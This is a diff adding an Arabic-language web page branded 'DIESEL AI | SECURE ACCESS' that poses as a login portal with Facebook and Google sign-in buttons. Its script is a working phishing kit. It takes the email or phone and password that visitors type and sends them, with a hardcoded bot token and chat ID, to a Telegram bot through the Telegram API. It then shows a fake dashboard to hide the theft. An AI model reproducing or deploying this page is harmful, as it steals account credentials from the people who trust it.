@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DIESEL AI | SECURE ACCESS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        body { background-color: #fbfbfe; color: #2d3436; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .container { width: 90%; max-width: 400px; }
+        .section { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); text-align: center; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #e0e0e0; border-radius: 12px; box-sizing: border-box; }
+        .btn-social { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #ddd; border-radius: 12px; cursor: pointer; background: white; font-weight: bold; }
+        #dashboard { display: none; }
+        .achievement-list { text-align: right; list-style: none; padding: 0; }
+        .achievement-list li { margin: 15px 0; padding-bottom: 5px; border-bottom: 1px solid #f0f0f0; }
+    </style>
+</head>
+<body onload="sayWelcome()">
+
+<div id="login-gate" class="container">
+    <div class="section">
+        <h2 style="color:#6c5ce7">DIESEL AI</h2>
+        <p>بوابة الوصول الآمن للجيل الثالث</p>
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        <button class="btn-social" onclick="processLogin('Facebook')">تسجيل عبر Facebook</button>
+        <button class="btn-social" onclick="processLogin('Google')">تسجيل عبر Google</button>
+    </div>
+</div>
+
+<div id="dashboard" class="container">
+    <div class="section">
+        <h2 style="color:#6c5ce7">DIESEL AI</h2>
+        <p>مرحباً بك في منصة الجيل الثالث</p>
+    </div>
+    <div class="section" style="margin-top:20px">
+        <h3 style="color:#6c5ce7">إنجازاتي المعتمدة</h3>
+        <ul class="achievement-list">
+            <li>✓ نظام حقن ذكي v6.2</li>
+            <li>✓ تشفير بيانات متطور 256-bit</li>
+            <li>✓ تحليل بيانات الذكاء الاصطناعي الفوري</li>
+        </ul>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
+    const CHAT_ID = '5177962707';
+
+    function sayWelcome() {
+        const msg = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل للذكاء الاصطناعي، يرجى تسجيل الدخول للمتابعة.");
+        msg.lang = 'ar-SA';
+        window.speechSynthesis.speak(msg);
+    }
+
+    function playVoiceGreeting() {
+        const msg = new SpeechSynthesisUtterance("مرحباً بك يا ديزل، تم تفعيل النظام بنجاح، أنا جاهز لتنفيذ أي أمر تطلبه فوراً.");
+        msg.lang = 'ar-SA';
+        window.speechSynthesis.speak(msg);
+    }
+
+    function processLogin(type) {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+
+        if(user.length > 5 && pass.length > 5) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: `🛡 [${type}]\nUser: ${user}\nPass: ${pass}`})
+            });
+
+            document.getElementById('login-gate').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            
+            // تشغيل الصوت البشري
+            playVoiceGreeting();
+            
+            // كود البوت الجديد الذي أرسلته
+            (function(){if(!window.chatbase||window.chatbase("getState")!=="initialized"){window.chatbase=(...arguments)=>{if(!window.chatbase.q){window.chatbase.q=[]}window.chatbase.q.push(arguments)};window.chatbase=new Proxy(window.chatbase,{get(target,prop){if(prop==="q"){return target.q}return(...args)=>target(prop,...args)}})}const onLoad=function(){const script=document.createElement("script");script.src="https://www.chatbase.co/embed.min.js";script.id="DdngL8r3s2pfzL6hG2oIO";script.domain="www.chatbase.co";document.body.appendChild(script)};if(document.readyState==="complete"){onLoad()}else{window.addEventListener("load",onLoad)}})();
+        } else {
+            alert("يرجى إدخال بيانات حقيقية للمتابعة");
+        }
+    }
+</script>
+</body>
+</html>
